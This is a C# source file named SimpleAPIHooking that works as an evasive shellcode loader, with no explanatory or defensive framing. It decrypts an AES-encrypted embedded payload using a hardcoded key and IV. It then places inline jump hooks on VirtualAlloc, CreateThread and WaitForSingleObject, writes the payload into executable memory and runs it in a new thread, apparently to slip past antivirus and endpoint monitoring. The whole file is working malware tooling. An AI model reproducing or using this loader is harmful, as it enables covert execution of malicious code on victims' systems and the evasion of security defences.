using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Cryptography;

namespace SimpleAPIHooking
{
    internal class Program
    {

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        public delegate IntPtr DelAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        public static IntPtr Hfunction(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
            Marshal.Copy(savebytes, 0, funcadd, savebytes.Length);

            DelAlloc delalloc = (DelAlloc)Marshal.GetDelegateForFunctionPointer(funcadd, typeof(DelAlloc));

            return delalloc(IntPtr.Zero, (uint)chelly.Length, commit | reserve, erw);
        }

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public delegate IntPtr DelCreate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public static IntPtr Hcreate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            Marshal.Copy(savebyteThread, 0, funcaddcreate, savebyteThread.Length);

            DelCreate delcreate = (DelCreate)Marshal.GetDelegateForFunctionPointer(funcaddcreate, typeof(DelCreate));

            return delcreate(lpThreadAttributes, dwStackSize, lpStartAddress,
            lpParameter, dwCreationFlags, lpThreadId);
        }

        public delegate UInt32 DelWait(IntPtr hHandle, UInt32 dwMilliseconds);

        public static UInt32 HWait(IntPtr hHandle, UInt32 dwMilliseconds)
        {
            Marshal.Copy(savebytewait, 0, funcaddwait, savebytewait.Length);

            DelWait delwait = (DelWait)Marshal.GetDelegateForFunctionPointer(funcaddwait, typeof(DelWait));

            return delwait(hHandle, dwMilliseconds);
        }

        public const uint commit = 0x1000;
        public const uint reserve = 0x2000;
        public const uint erw = 0x40;
        public const uint infini = 0xFFFFFFFF;

        public static IntPtr funcadd;
        public static byte[] savebytes;
        public static IntPtr funcaddcreate;
        public static byte[] savebyteThread;
        public static IntPtr funcaddwait;
        public static byte[] savebytewait;

        public static byte[] Key = Convert.FromBase64String("UWvdzxNvawefjcAUkEQHeq==");
        public static byte[] IV = Convert.FromBase64String("WUcLtUFSRczMSaEHrdBBRD==");
        public static byte[] testy = new byte[] { 0x9d, 0xdb, 0xef, 0x46, 0x17, 0x51, 0x8a, 0xbb, 0xb5, 0x50, 0x2e, 0x84, 0x28, 0x5b, 0xe1, 0x58, 0x21, 0x20, 0x89, 0xca, 0x84, 0xe0, 0x25, 0xd8, 0xf0, 0x7b, 0x79, 0x98, 0x6c, 0xc7, 0xe4, 0x70, 0x48, 0x9e, 0x17, 0xba, 0xf7, 0xc1, 0x72, 0x83, 0xb4, 0x44, 0xc7, 0xaf, 0xdd, 0xc5, 0x28, 0x3c, 0xce, 0x8e, 0x9c, 0xa9, 0xfb, 0x4b, 0x47, 0xb0, 0xe5, 0x81, 0x30, 0x3c, 0x82, 0xb8, 0x19, 0x9d, 0x06, 0xb9, 0x59, 0xf3, 0x50, 0x31, 0xc3, 0xc7, 0x1c, 0x53, 0x00, 0xc8, 0x26, 0xd8, 0x8f, 0xc3, 0xbf, 0xb7, 0x6b, 0xb3, 0xd4, 0xfb, 0x62, 0xed, 0xf0, 0x48, 0xde, 0x6f, 0xac, 0x85, 0xce, 0xde, 0x9b, 0x3e, 0xc6, 0x33, 0xae, 0x6f, 0x85, 0x33, 0x5b, 0x0f, 0xb2, 0x07, 0x2d, 0x2c, 0xa3, 0x79, 0xab, 0x78, 0xd5, 0x03, 0x5e, 0x2e, 0xb7, 0x5f, 0xf9, 0x54, 0x22, 0x2b, 0xd5, 0xc4, 0xd6, 0x80, 0xbd, 0xf3, 0xb6, 0x8f, 0x61, 0x78, 0x0b, 0x04, 0xfc, 0xe4, 0xdf, 0x25, 0x28, 0x19, 0x07, 0xd3, 0x16, 0x47, 0x12, 0x8b, 0x85, 0xc4, 0x54, 0xa2, 0x5d, 0x80, 0xc6, 0x93, 0xee, 0xf3, 0x6c, 0xca, 0x2a, 0x39, 0xb2, 0xd1, 0x9b, 0xcf, 0x2e, 0xc5, 0x95, 0x01, 0xd8, 0x18, 0x75, 0x32, 0xc3, 0x56, 0x67, 0x1f, 0xc1, 0x6a, 0x12, 0xe5, 0x02, 0x40, 0x41, 0x19, 0x20, 0x52, 0xfe, 0x52, 0x1f, 0x02, 0x85, 0xa3, 0x22, 0x87, 0x24, 0xb8, 0x59, 0xe2, 0x05, 0x72, 0x84, 0x37, 0xe0, 0xb4, 0x96, 0x8b, 0xa8, 0x89, 0x74, 0xa4, 0x03, 0x95, 0xfb, 0x71, 0xc3, 0xe0, 0xf6, 0x6d, 0x4f, 0x73, 0xac, 0xf3, 0xed, 0xc3, 0x7e, 0xb8, 0x92, 0x0a, 0xbd, 0xef, 0x1b, 0xcc, 0x6a, 0xe5, 0xe1, 0x5c, 0x96, 0x07, 0x3f, 0xbc, 0x84, 0x6f, 0x81, 0x3d, 0x64, 0x43, 0xc7, 0xef, 0xc8, 0x29, 0xd9, 0xca, 0xb2, 0x4f, 0x4a, 0x93, 0xcb, 0x19, 0xd2, 0xa3, 0xd3, 0x6c, 0xa3, 0x75, 0x18, 0xe1, 0x0c, 0x61, 0x8d, 0x9d, 0x5a, 0xc1, 0xf9, 0xf3, 0x4d, 0x96, 0xc3, 0xd3, 0x9c, 0xb2, 0xa6, 0x9b, 0x92, 0x32, 0xfe, 0x97, 0xbc, 0x8c, 0x24, 0xf9, 0x02, 0x46, 0x68, 0x17, 0x17, 0xe2, 0x2f, 0xe3, 0x5c, 0xaf, 0x81, 0x94, 0x78, 0xf1, 0xcf, 0x44, 0x6b, 0xaa, 0xfd, 0x2d, 0x53, 0xb2, 0xcc, 0x19, 0xc5, 0x25, 0x73, 0xa3, 0x47, 0xb3, 0x21, 0xcb, 0x34, 0x99, 0xfc, 0x1e, 0xdb, 0x06, 0x42, 0x98, 0x5e, 0x32, 0xfa, 0x9f, 0x75, 0x37, 0x5a, 0x5a, 0xcc, 0x3c, 0x99, 0xff, 0xfb, 0x2c, 0x53, 0xce, 0xa6, 0x7b, 0xcd, 0xe6, 0x78, 0xa0, 0x6c, 0x43, 0xeb, 0xe9, 0xc2, 0x26, 0x72, 0x0d, 0x6f, 0xc4, 0x6d, 0x85, 0xb3, 0xf4, 0xf4, 0xa6, 0x22, 0x89, 0x7e, 0xa0, 0x4c, 0xa4, 0xc8, 0x93, 0x55, 0x36, 0xa6, 0xd5, 0xb8, 0x93, 0x29, 0xe6, 0xac, 0x3a, 0x29, 0x6c, 0x61, 0xd5, 0x58, 0x83, 0x2d, 0xba, 0x90, 0x13, 0x11, 0x08, 0x23, 0x3b, 0xed, 0x8c, 0xf3, 0xdc, 0x37, 0x89, 0x8c, 0xa3, 0xb4, 0xe8, 0x48, 0xe4, 0xa7, 0x38, 0x2e, 0x66, 0xce, 0xf0, 0xa7, 0xa0, 0x41, 0xfb, 0x47, 0xdb, 0xcb, 0xde, 0x5d, 0xfc, 0x08, 0x5e, 0xd7, 0x11, 0xe2, 0xe6, 0xf2, 0xf7, 0x67, 0xba, 0x56, 0x75, 0x84, 0x9f, 0x64, 0xd2, 0x11, 0x52, 0xdc, 0xc6, 0xf4, 0x5b, 0x1a, 0x99, 0xd3, 0x97, 0xb6, 0x4e, 0x3b, 0x61, 0xa6, 0xba, 0xcd, 0x90, 0x66, 0x4f, 0xb8, 0x8a, 0x7b, 0x35, 0xa0, 0xfe, 0xf7, 0x57, 0x44, 0x94, 0x3c, 0x6e, 0x52, 0x60, 0x6e, 0x6a, 0x66, 0x42, 0xf0, 0x33, 0xf3, 0x08, 0xd9, 0xd7, 0x3e, 0xa5, 0x26, 0x5a, 0x54, 0xc7, 0x58, 0xc5, 0xe3, 0xb9, 0xe5, 0x66, 0x65, 0x23, 0x5e, 0x23, 0xab, 0x8d, 0x82, 0xd9, 0x74, 0x85, 0x15, 0x79, 0x43, 0x2e, 0x44, 0x6b, 0x96, 0xfe, 0xb9, 0xa4, 0x19, 0xdf, 0xda, 0xf1, 0x50, 0x46, 0x99, 0x9a, 0x1a, 0x02, 0x17, 0x6f, 0x8c, 0x7d, 0x34, 0x90, 0xa7, 0x25, 0x46, 0xc7, 0xb4, 0x97, 0x7c, 0xa0, 0x7a, 0xe0, 0x4b, 0xc7, 0x12, 0x7a, 0x94, 0x45, 0xaf, 0x3f, 0x52, 0x66, 0xa8, 0xd6, 0x85, 0x5a, 0xf0, 0x16, 0x37, 0x2e, 0xc9, 0xc5, 0xb1, 0x16, 0xf9, 0x09, 0x55, 0xa1, 0x5a, 0xfe, 0xd1, 0x9d, 0xd6, 0x3e, 0xd0, 0xb9, 0x4d, 0x16, 0x5e, 0x66, 0x11, 0x1a, 0x86, 0xb6, 0xde, 0xf6, 0x9d, 0x5f, 0xe2, 0x85, 0x82, 0xd7, 0xc7, 0x85, 0x53, 0xda, 0x85, 0x2b, 0xfe, 0xd6, 0x8f, 0xf4, };//here shellcode AES encrypted
        public static byte[] chelly = AESDecrypt(testy, Key, IV);
        static void Main(string[] args)
        {
            IntPtr loadKer32 = LoadLibrary("kernel32");
            funcadd = GetProcAddress(loadKer32, "VirtualAlloc");

            savebytes = new byte[5];
            Marshal.Copy(funcadd, savebytes, 0, 5);

            IntPtr hookadd = Marshal.GetFunctionPointerForDelegate((DelAlloc)Hfunction);

            byte[] jmp = new byte[5];
            jmp[0] = 0xe9; //opcode
            long offset = (long)hookadd - (long)funcadd - 5;
            Array.Copy(BitConverter.GetBytes(offset), jmp, 4);

            uint oldp = 0;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, funcadd, (UIntPtr)5, erw, out oldp);
            Marshal.Copy(jmp, 0, funcadd, jmp.Length);

            IntPtr advir = Hfunction(IntPtr.Zero, (uint)chelly.Length, commit | reserve, erw); //VirtualAlloc Hooked

            Marshal.Copy(chelly, 0, advir, chelly.Length);

            IntPtr loadkernelThread = LoadLibrary("kernel32");
            funcaddcreate = GetProcAddress(loadkernelThread, "CreateThread");

            savebyteThread = new byte[5];
            Marshal.Copy(funcaddcreate, savebyteThread, 0, 5);

            IntPtr hookaddthread = Marshal.GetFunctionPointerForDelegate((DelCreate)Hcreate);

            byte[] jmpy = new byte[5];
            jmpy[0] = 0xe9;
            long ofset = (long)hookaddthread - (long)funcaddcreate - 5;
            Array.Copy(BitConverter.GetBytes(ofset), jmpy, 4);

            uint oldy = 0;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, funcaddcreate, (UIntPtr)5, erw, out oldy);
            Marshal.Copy(jmpy, 0, funcaddcreate, jmpy.Length);
            IntPtr th = Hcreate(IntPtr.Zero, 0, advir, IntPtr.Zero, 0, IntPtr.Zero);

            IntPtr loadwait = LoadLibrary("kernel32.dll");
            funcaddwait = GetProcAddress(loadwait, "WaitForSingleObject");

            savebytewait = new byte[5];
            Marshal.Copy(funcaddwait, savebytewait, 0, 5);

            IntPtr hookaddwait = Marshal.GetFunctionPointerForDelegate((DelWait)HWait);

            byte[] jmpywait = new byte[5];
            jmpywait[0] = 0xe9;
            long offsetwait = (long)hookaddwait - (long)funcaddwait - 5;
            Array.Copy(BitConverter.GetBytes(offsetwait), jmpywait, 4);

            uint oldywait = 0;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, funcaddwait, (UIntPtr)5, erw, out oldywait);
            Marshal.Copy(jmpywait, 0, funcaddwait, jmpywait.Length);

            HWait(th, infini);

        }

        private static byte[] AESDecrypt(byte[] CEncryptedShell, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return GetDecrypt(CEncryptedShell, decryptor);
                }
            }
        }
        private static byte[] GetDecrypt(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }
    }
}

